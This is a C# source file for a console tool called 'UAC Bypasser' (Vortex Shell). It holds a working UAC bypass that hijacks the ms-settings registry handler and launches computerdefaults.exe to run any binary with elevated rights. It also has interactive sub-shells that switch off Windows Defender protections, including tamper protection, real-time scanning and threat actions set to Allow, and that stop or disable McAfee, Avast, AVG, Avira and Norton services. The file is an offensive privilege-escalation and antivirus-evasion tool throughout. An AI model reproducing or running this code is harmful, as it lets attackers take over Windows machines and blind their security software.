using System;
using System.Diagnostics;
using Microsoft.Win32;
using System.Threading;
using System.Management;

namespace UAC_Bypasser
{
    class Program
    {
        static string detectedOS = "Unknown";

        static void Main(string[] args)
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.DarkRed;

            string logo = @"
  _    _          _____   ____                                           
 | |  | |   /\   / ____| |  _ \                                          
 | |  | |  /  \ | |      | |_) |_   _ _ __   __ _ ___ ___  ___ _ __      
 | |  | | / /\ \| |      |  _ <| | | | '_ \ / _` / __/ __|/ _ \ '__|     
 | |__| |/ ____ \ |____  | |_) | |_| | |_) | (_| \__ \__ \  __/ |        
  \____ /_/    \_\_____| |____/ \__, | .__/ \__,_|___/___/\___|_|        
                                 __/ | |                                 
                                |___/|_| 
";
            AnimateHackerText(logo.Trim('\n', '\r'));
            
            // Session Info
            detectedOS = GetOSVersion();
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine($"\n[*] Starting session at {DateTime.Now:HH:mm} day {DateTime.Now:dd:MM:yyyy}");
            Console.WriteLine($"[*] OS Detected: {detectedOS}");
            Console.WriteLine("[*] Interface: Vortex Shell v2.2.0 (Defender Optimized)\n");
            Console.ResetColor();

            // Handle direct arguments first
            if (args.Length >= 1)
            {
                ExecuteBypass(args[0]);
            }

            // Shell Loop
            while (true)
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("UAC-Bypasser> ");
                Console.ResetColor();
                
                string input = Console.ReadLine() ?? "";
                if (string.IsNullOrWhiteSpace(input)) continue;

                string lowerInput = input.ToLower().Trim();

                if (lowerInput == "exit" || lowerInput == "quit") break;
                if (lowerInput == "help" || lowerInput == "-h" || lowerInput == "--help")
                {
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine("Usage: vortex-shell [options] [command]");
                    Console.WriteLine();
                    Console.WriteLine("Options:");
                    Console.WriteLine("  -h, --help            Show this help message and exit");
                    Console.WriteLine();
                    Console.WriteLine("Commands:");
                    Console.WriteLine("  run <path>            Execute a binary with SYSTEM/elevated privileges");
                    Console.WriteLine("  antivirus, av         Subsystem to query installed Antivirus (e.g., av -l)");
                    Console.WriteLine("  windows-defender, wd  Subsystem for Windows Defender core configuration");
                    Console.WriteLine("  mcafee, mfe           Subsystem for McAfee/Trellix Endpoint Security");
                    Console.WriteLine("  avast                 Subsystem for Avast Software management");
                    Console.WriteLine("  avg                   Subsystem for AVG Technologies management");
                    Console.WriteLine("  avira                 Subsystem for Avira Security management");
                    Console.WriteLine("  norton                Subsystem for Norton/Symantec management");
                    Console.WriteLine("  clear                 Clear terminal buffer");
                    Console.WriteLine("  exit, quit            Terminate the current session");
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("Examples:");
                    Console.WriteLine("  run \"C:\\Windows\\System32\\cmd.exe\"");
                    Console.WriteLine("  mcafee");
                    Console.WriteLine();
                    Console.ResetColor();
                    continue;
                }
                if (lowerInput == "clear")
                {
                    Console.Clear();
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.WriteLine(logo);
                    Console.ResetColor();
                    continue;
                }

                if (input.StartsWith("run ", StringComparison.OrdinalIgnoreCase))
                {
                    string target = input.Substring(4).Trim();
                    ExecuteBypass(target);
                }
                else if (lowerInput == "antivirus -l" || lowerInput == "av -l" || lowerInput == "antivirus" || lowerInput == "av")
                {
                    ListAntivirus();
                }
                else if (lowerInput == "windows-defender" || lowerInput == "wd")
                {
                    WindowsDefenderShell();
                }
                else if (lowerInput == "mcafee" || lowerInput == "mfe")
                {
                    McAfeeShell();
                }
                else if (lowerInput == "avast")
                {
                    AvastShell();
                }
                else if (lowerInput == "avg")
                {
                    AVGShell();
                }
                else if (lowerInput == "avira")
                {
                    AviraShell();
                }
                else if (lowerInput == "norton")
                {
                    NortonShell();
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[-] Unknown command. Type 'help' for commands.");
                    Console.ResetColor();
                }
            }
        }

        static void AnimateHackerText(string logo)
        {
            // split by any newline variant and trim empty lines that might cause displacement
            string[] lines = logo.Replace("\r\n", "\n").Split('\n');
            int totalSteps = 12;
            int delay = 20;
            Random rand = new Random();
            string chars = "!@#$%^&*()_+-=[]{}|;:,.<>?/0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";

            // Map characters to reveal points
            int[][] revealSteps = new int[lines.Length][];
            for (int i = 0; i < lines.Length; i++)
            {
                revealSteps[i] = new int[lines[i].Length];
                for (int j = 0; j < lines[i].Length; j++)
                {
                    revealSteps[i][j] = char.IsWhiteSpace(lines[i][j]) ? 0 : rand.Next(2, totalSteps + 1);
                }
            }

            Console.CursorVisible = false;
            int startTop = Console.CursorTop;

            for (int step = 0; step <= totalSteps; step++)
            {
                Console.SetCursorPosition(0, startTop);
                for (int i = 0; i < lines.Length; i++)
                {
                    // Ensure we only write within the console width to prevent misalignment
                    string currentLine = lines[i];
                    for (int j = 0; j < currentLine.Length; j++)
                    {
                        if (char.IsWhiteSpace(currentLine[j]))
                        {
                            Console.Write(" ");
                        }
                        else if (step >= revealSteps[i][j])
                        {
                            Console.ForegroundColor = ConsoleColor.DarkRed;
                            Console.Write(currentLine[j]);
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.Write(chars[rand.Next(chars.Length)]);
                        }
                    }
                    Console.WriteLine();
                }
                Thread.Sleep(delay);
            }
            Console.ResetColor();
            Console.CursorVisible = true;
        }

        static void ListAntivirus()
        {
            try
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("\n[*] Scanning for antivirus products...\n");

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(
                    @"root\SecurityCenter2",
                    "SELECT * FROM AntiVirusProduct"))
                {
                    ManagementObjectCollection results = searcher.Get();
                    int count = 0;

                    foreach (ManagementObject obj in results)
                    {
                        count++;
                        string name = obj["displayName"]?.ToString() ?? "Unknown";
                        string state = obj["productState"]?.ToString() ?? "0";

                        // Parse productState to determine if AV is enabled/updated
                        uint productState = uint.Parse(state);
                        string enabled = ((productState >> 12) & 0xF) == 1 ? "Enabled" : "Disabled";
                        string updated = ((productState >> 4) & 0xF) == 0 ? "Up to date" : "Outdated";

                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine($"  [{count}] {name}");
                        Console.ForegroundColor = enabled == "Enabled" ? ConsoleColor.Green : ConsoleColor.Red;
                        Console.WriteLine($"      Status:  {enabled}");
                        Console.ForegroundColor = updated == "Up to date" ? ConsoleColor.Green : ConsoleColor.Yellow;
                        Console.WriteLine($"      Updates: {updated}");
                        Console.WriteLine();
                    }

                    if (count == 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("  [!] No antivirus products found.");
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine($"  [*] Total: {count} product(s) detected.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[-] Error querying antivirus: {ex.Message}");
            }
            Console.ResetColor();
            Console.WriteLine();
        }

        static void ExecuteBypass(string targetCmd)
        {
            try
            {
                Console.WriteLine($"\n[+] Elevating: {targetCmd}");

                // 1. Create the registry key
                string regPath = @"Software\Classes\ms-settings\Shell\Open\command";
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(regPath))
                {
                    if (key == null)
                    {
                        Console.WriteLine("[-] Error creating registry key.");
                        return;
                    }

                    // 2. Set the (Default) value to our target command
                    key.SetValue("", targetCmd);

                    // 3. Set DelegateExecute to an empty string to trigger the bypass
                    key.SetValue("DelegateExecute", "");
                }

                Console.WriteLine("[+] Registry hijacked successfully.");
                Console.WriteLine("[+] Triggering bypass with computerdefaults.exe...");

                // 4. Start computerdefaults.exe to trigger the bypass
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "C:\\Windows\\System32\\computerdefaults.exe",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                Process.Start(psi);

                // Wait briefly for the bypass to trigger
                Thread.Sleep(1500);
                
                Console.WriteLine("[+] Bypass executed.");

                // 5. Cleanup the registry
                Console.WriteLine("[+] Cleaning up registry...");
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false);

                Console.WriteLine("[+] Done.\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.Message}");
                // Cleanup in case of error
                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false); } catch { }
            }
        }

        static void WindowsDefenderShell()
        {
            Console.WriteLine($"[*] Entering Windows Defender configuration mode ({detectedOS})...");
            while (true)
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("UAC-Bypasser/windows-defender> ");
                Console.ResetColor();

                string input = Console.ReadLine() ?? "";
                if (string.IsNullOrWhiteSpace(input)) continue;

                string[] parts = input.ToLower().Trim().Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries);
                string cmd = parts[0];
                string arg = parts.Length > 1 ? parts[1] : "";

                if (cmd == "back") break;
                if (cmd == "exit" || cmd == "quit") Environment.Exit(0);
                if (cmd == "help" || cmd == "-h" || cmd == "--help")
                {
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine("Usage: <action> [feature]");
                    Console.WriteLine();
                    Console.WriteLine("Actions:");
                    Console.WriteLine("  enable, on            Enable the specified Defender feature");
                    Console.WriteLine("  disable, off          Disable the specified Defender feature");
                    Console.WriteLine();
                    Console.WriteLine("Features:");
                    Console.WriteLine("  -registry             Modify Defender via Registry");
                    Console.WriteLine("  -realtime             Real-Time Monitoring");
                    Console.WriteLine("  -behavior             Behavior Monitoring");
                    Console.WriteLine("  -blockatfirstseen     Block at First Seen");
                    Console.WriteLine("  -ioav                 IOAV Protection (scans of downloads)");
                    Console.WriteLine("  -privacy              Privacy Mode");
                    Console.WriteLine("  -signature-update     Signature update on startup");
                    Console.WriteLine("  -archive              Archive file scanning");
                    Console.WriteLine("  -ips                  Network intrusion prevention system (IPS)");
                    Console.WriteLine("  -script               Script scanning");
                    Console.WriteLine("  -maps                 MAPS Reporting");
                    Console.WriteLine("  -submit-samples       Submit Samples Consent");
                    Console.WriteLine("  -allow-threats        Set default actions to Allow (all levels)");
                    Console.WriteLine("  -all                  Execute for all features");
                    Console.WriteLine();
                    Console.WriteLine("Other:");
                    Console.WriteLine("  back                  Return to the main vortex shell");
                    Console.WriteLine("  exit, quit            Terminate the current session");
                    Console.WriteLine();
                    Console.WriteLine("Examples:");
                    Console.WriteLine("  disable -realtime");
                    Console.WriteLine("  enable -all");
                    Console.WriteLine();
                    Console.ResetColor();
                    continue;
                }

                bool isEnable = (cmd == "enable" || cmd == "on");
                bool isDisable = (cmd == "disable" || cmd == "off");

                if (!isEnable && !isDisable)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[-] Unknown command. Use 'disable -<feature>' or 'enable -<feature>'. Type 'help' for features.");
                    Console.ResetColor();
                    continue;
                }

                if (string.IsNullOrEmpty(arg))
                {
                    Console.WriteLine("[-] Please specify a feature (e.g., -realtime).");
                    continue;
                }

                ExecuteWDAction(arg, isEnable);
            }
        }

        static void ExecuteWDAction(string feature, bool enable)
        {
            string stateStr = enable ? "enabling" : "disabling";
            string psVal = enable ? "$false" : "$true"; // Logic: DisableRealtimeMonitoring $true = Disabled
            string regVal = enable ? "0" : "1";       // Logic: DisableAntiSpyware 1 = Disabled

            switch (feature)
            {
                case "-registry":
                    RegistryEditWD(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", enable ? "1" : "0");
                    RegistryEditWD(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", regVal);
                    RegistryEditWD(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", regVal);
                    RegistryEditWD(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", regVal);
                    RegistryEditWD(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", regVal);
                    Console.WriteLine($"[+] Registry entries updated ({stateStr}).");
                    break;

                case "-realtime": RunPSWD($"Set-MpPreference -DisableRealtimeMonitoring {psVal}"); break;
                case "-behavior": RunPSWD($"Set-MpPreference -DisableBehaviorMonitoring {psVal}"); break;
                case "-blockatfirstseen": RunPSWD($"Set-MpPreference -DisableBlockAtFirstSeen {psVal}"); break;
                case "-ioav": RunPSWD($"Set-MpPreference -DisableIOAVProtection {psVal}"); break;
                case "-privacy": RunPSWD($"Set-MpPreference -DisablePrivacyMode {psVal}"); break;
                case "-signature-update": RunPSWD($"Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine {psVal}"); break;
                case "-archive": RunPSWD($"Set-MpPreference -DisableArchiveScanning {psVal}"); break;
                case "-ips": RunPSWD($"Set-MpPreference -DisableIntrusionPreventionSystem {psVal}"); break;
                case "-script": RunPSWD($"Set-MpPreference -DisableScriptScanning {psVal}"); break;
                case "-maps": RunPSWD($"Set-MpPreference -MAPSReporting {(enable ? "2" : "0")}"); break;
                case "-submit-samples": RunPSWD($"Set-MpPreference -SubmitSamplesConsent {(enable ? "1" : "2")}"); break;
                case "-allow-threats":
                    string action = enable ? "1" : "6"; // 1=Clean, 6=Allow
                    RunPSWD($"Set-MpPreference -HighThreatDefaultAction {action}");
                    RunPSWD($"Set-MpPreference -ModerateThreatDefaultAction {action}");
                    RunPSWD($"Set-MpPreference -LowThreatDefaultAction {action}");
                    RunPSWD($"Set-MpPreference -SevereThreatDefaultAction {action}");
                    break;

                case "-all":
                    Console.WriteLine($"[*] {stateStr} all features...");
                    ExecuteWDAction("-registry", enable);
                    ExecuteWDAction("-realtime", enable);
                    ExecuteWDAction("-behavior", enable);
                    ExecuteWDAction("-blockatfirstseen", enable);
                    ExecuteWDAction("-ioav", enable);
                    ExecuteWDAction("-privacy", enable);
                    ExecuteWDAction("-signature-update", enable);
                    ExecuteWDAction("-archive", enable);
                    ExecuteWDAction("-ips", enable);
                    ExecuteWDAction("-script", enable);
                    ExecuteWDAction("-submit-samples", enable);
                    ExecuteWDAction("-maps", enable);
                    ExecuteWDAction("-allow-threats", enable);
                    break;

                default:
                    Console.WriteLine($"[-] Unknown feature: {feature}");
                    break;
            }
        }

        static string GetOSVersion()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject os in searcher.Get())
                    {
                        string caption = os["Caption"]?.ToString() ?? "Windows";
                        if (caption.Contains("Windows 11")) return "Windows 11";
                        if (caption.Contains("Windows 10")) return "Windows 10";
                        return caption;
                    }
                }
            }
            catch { }
            return Environment.OSVersion.ToString();
        }

        private static void RegistryEditWD(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name)?.ToString() != value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[-] Error editing registry: {ex.Message}");
                Console.ResetColor();
            }
        }

        private static void RunPSWD(string args)
        {
            try
            {
                Process proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "powershell",
                        Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{args}\"",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                proc.WaitForExit();
                Console.WriteLine($"[+] Executed: {args.Substring(0, Math.Min(args.Length, 45))}...");
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[-] Error running PowerShell: {ex.Message}");
                Console.ResetColor();
            }
        }

        static void McAfeeShell()
        {
            Console.WriteLine($"[*] Entering McAfee/Trellix configuration mode...");
            while (true)
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("UAC-Bypasser/mcafee> ");
                Console.ResetColor();

                string input = Console.ReadLine() ?? "";
                if (string.IsNullOrWhiteSpace(input)) continue;

                string[] parts = input.ToLower().Trim().Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries);
                string cmd = parts[0];
                string arg = parts.Length > 1 ? parts[1] : "";

                if (cmd == "back") break;
                if (cmd == "exit" || cmd == "quit") Environment.Exit(0);
                if (cmd == "help" || cmd == "-h" || cmd == "--help")
                {
                    Console.WriteLine("\nUsage: <action> [feature]");
                    Console.WriteLine("\nActions:");
                    Console.WriteLine("  disable             Disable a specific protection feature");
                    Console.WriteLine("  stop                Attempt to stop McAfee services");
                    Console.WriteLine("  registry            Modify registry-based protection settings");
                    Console.WriteLine("\nFeatures:");
                    Console.WriteLine("  -oas                On-Access-Scanner (using mfetpcli)");
                    Console.WriteLine("  -firewall           McAfee Firewall module");
                    Console.WriteLine("  -tamper             Tamper Protection registry key");
                    Console.WriteLine("  -services           Stop all McAfee related services (McShield, etc.)");
                    Console.WriteLine("\nOther:");
                    Console.WriteLine("  back                Return to the main vortex shell");
                    Console.WriteLine();
                    continue;
                }

                if (cmd == "disable" && arg == "-oas") RunPSWD("mfetpcli --oas off");
                else if (cmd == "disable" && arg == "-firewall") RegistryEditHklm(@"SOFTWARE\McAfee\Endpoint\Firewall", "EnableFirewall", "0");
                else if (cmd == "stop" && arg == "-services") { 
                    StopService("McShield"); StopService("McAfeeFramework"); StopService("mfevtps"); 
                }
                else if (cmd == "registry" && arg == "-tamper") RegistryEditHklm(@"SOFTWARE\McAfee\Endpoint\Common", "TamperProtection", "0");
                else Console.WriteLine("[-] Unknown McAfee command.");
            }
        }

        static void AvastShell()
        {
            Console.WriteLine($"[*] Entering Avast configuration mode...");
            while (true)
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("UAC-Bypasser/avast> ");
                Console.ResetColor();

                string input = Console.ReadLine() ?? "";
                if (string.IsNullOrWhiteSpace(input)) continue;

                string[] parts = input.ToLower().Trim().Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries);
                string cmd = parts[0];
                string arg = parts.Length > 1 ? parts[1] : "";

                if (cmd == "back") break;
                if (cmd == "exit" || cmd == "quit") Environment.Exit(0);
                if (cmd == "help" || cmd == "-h" || cmd == "--help")
                {
                    Console.WriteLine("\nUsage: <action> [options]");
                    Console.WriteLine("\nActions:");
                    Console.WriteLine("  scan                Run ashCmd line scanner");
                    Console.WriteLine("  disable             Disable shields via registry/service");
                    Console.WriteLine("  exclude             Add path to exclusions");
                    Console.WriteLine("\nOptions:");
                    Console.WriteLine("  -full               Full system scan (/*)");
                    Console.WriteLine("  -shields            Attempt to disable all active shields");
                    Console.WriteLine("  -path <path>        Specifically exclude or scan a path");
                    Console.WriteLine("\nOther:");
                    Console.WriteLine("  back                Return to the main vortex shell");
                    Console.WriteLine();
                    continue;
                }

                if (cmd == "scan" && arg == "-full") RunCommand("ashCmd.exe /* /_");
                else if (cmd == "disable" && arg == "-shields") {
                    RegistryEditHklm(@"SOFTWARE\Avast Software\Avast", "ShieldsEnabled", "0");
                    StopService("aswServ");
                }
                else Console.WriteLine("[-] Unknown Avast command.");
            }
        }

        static void AVGShell()
        {
            Console.WriteLine($"[*] Entering AVG configuration mode...");
            while (true)
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("UAC-Bypasser/avg> ");
                Console.ResetColor();

                string input = Console.ReadLine() ?? "";
                if (string.IsNullOrWhiteSpace(input)) continue;

                string[] parts = input.ToLower().Trim().Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries);
                string cmd = parts[0];
                string arg = parts.Length > 1 ? parts[1] : "";

                if (cmd == "back") break;
                if (cmd == "exit" || cmd == "quit") Environment.Exit(0);
                if (cmd == "help" || cmd == "-h" || cmd == "--help")
                {
                    Console.WriteLine("\nUsage: <action> [options]");
                    Console.WriteLine("\nActions:");
                    Console.WriteLine("  scan                Run AVG command line scanner");
                    Console.WriteLine("  disable             Disable protection shields");
                    Console.WriteLine("  registry            Tweak AVG registry settings");
                    Console.WriteLine("\nOptions:");
                    Console.WriteLine("  -all                Apply to all protection modules");
                    Console.WriteLine("  -shields            Real-time component management");
                    Console.WriteLine("\nOther:");
                    Console.WriteLine("  back                Return to the main vortex shell");
                    Console.WriteLine();
                    continue;
                }

                if (cmd == "disable" && arg == "-shields") {
                    StopService("avgwd"); StopService("avgRun");
                    RegistryEditHklm(@"SOFTWARE\AVG\AVG10", "ShieldsDisabled", "1");
                }
                else Console.WriteLine("[-] Unknown AVG command.");
            }
        }

        static void AviraShell()
        {
            Console.WriteLine($"[*] Entering Avira configuration mode...");
            while (true)
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("UAC-Bypasser/avira> ");
                Console.ResetColor();

                string input = Console.ReadLine() ?? "";
                if (string.IsNullOrWhiteSpace(input)) continue;

                string[] parts = input.ToLower().Trim().Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries);
                string cmd = parts[0];
                string arg = parts.Length > 1 ? parts[1] : "";

                if (cmd == "back") break;
                if (cmd == "exit" || cmd == "quit") Environment.Exit(0);
                if (cmd == "help" || cmd == "-h" || cmd == "--help")
                {
                    Console.WriteLine("\nUsage: <action> [feature]");
                    Console.WriteLine("\nActions:");
                    Console.WriteLine("  scan                Invoke ScanCL scanner");
                    Console.WriteLine("  disable             Disable Avira Real-Time Protection");
                    Console.WriteLine("  stop                Kill Avira background processes");
                    Console.WriteLine("\nFeatures:");
                    Console.WriteLine("  -rtp                Real-Time Protection module");
                    Console.WriteLine("  -services           Avira.ServiceHost and related");
                    Console.WriteLine("\nOther:");
                    Console.WriteLine("  back                Return to the main vortex shell");
                    Console.WriteLine();
                    continue;
                }

                if (cmd == "disable" && arg == "-rtp") RegistryEditHklm(@"SOFTWARE\Avira\Antivirus", "DisableRTP", "1");
                else if (cmd == "stop" && arg == "-services") StopService("Avira.ServiceHost");
                else Console.WriteLine("[-] Unknown Avira command.");
            }
        }

        static void NortonShell()
        {
            Console.WriteLine($"[*] Entering Norton configuration mode...");
            while (true)
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("UAC-Bypasser/norton> ");
                Console.ResetColor();

                string input = Console.ReadLine() ?? "";
                if (string.IsNullOrWhiteSpace(input)) continue;

                string[] parts = input.ToLower().Trim().Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries);
                string cmd = parts[0];
                string arg = parts.Length > 1 ? parts[1] : "";

                if (cmd == "back") break;
                if (cmd == "exit" || cmd == "quit") Environment.Exit(0);
                if (cmd == "help" || cmd == "-h" || cmd == "--help")
                {
                    Console.WriteLine("\nUsage: <action> [parameter]");
                    Console.WriteLine("\nActions:");
                    Console.WriteLine("  disable             Disable Norton Auto-Protect");
                    Console.WriteLine("  stop                Stop Symantec/Norton services");
                    Console.WriteLine("  registry            Policy manipulation");
                    Console.WriteLine("\nParameters:");
                    Console.WriteLine("  -autoprotect        Toggle real-time engine");
                    Console.WriteLine("  -services           ccEvtMgr, ccSetMgr, etc.");
                    Console.WriteLine("\nOther:");
                    Console.WriteLine("  back                Return to the main vortex shell");
                    Console.WriteLine();
                    continue;
                }

                if (cmd == "disable" && arg == "-autoprotect") RegistryEditHklm(@"SOFTWARE\Norton\{...}\Policy", "AutoProtect", "0");
                else if (cmd == "stop" && arg == "-services") {
                    StopService("ccEvtMgr"); StopService("ccSetMgr"); StopService("navapsvc");
                }
                else Console.WriteLine("[-] Unknown Norton command.");
            }
        }

        static void RegistryEditHklm(string regPath, string name, string value)
        {
            try
            {
                Console.WriteLine($"[+] Attempting registry change: {name} -> {value}");
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, true))
                {
                    if (key != null) key.SetValue(name, value, RegistryValueKind.DWord);
                    else {
                        using (RegistryKey newKey = Registry.LocalMachine.CreateSubKey(regPath))
                        {
                            newKey.SetValue(name, value, RegistryValueKind.DWord);
                        }
                    }
                }
                Console.WriteLine("[+] Registry updated.");
            }
            catch (Exception ex) { Console.WriteLine($"[-] Registry Access Denied: {ex.Message}"); }
        }

        static void StopService(string serviceName)
        {
            try
            {
                Console.WriteLine($"[*] Attempting to stop service: {serviceName}");
                RunPSWD($"Stop-Service -Name {serviceName} -Force");
            }
            catch { Console.WriteLine($"[-] Failed to stop {serviceName}"); }
        }

        static void RunCommand(string cmd)
        {
            try { Process.Start("cmd.exe", $"/c {cmd}"); Console.WriteLine($"[+] Executed: {cmd}"); }
            catch { Console.WriteLine($"[-] Failed to execute: {cmd}"); }
        }
    }
}

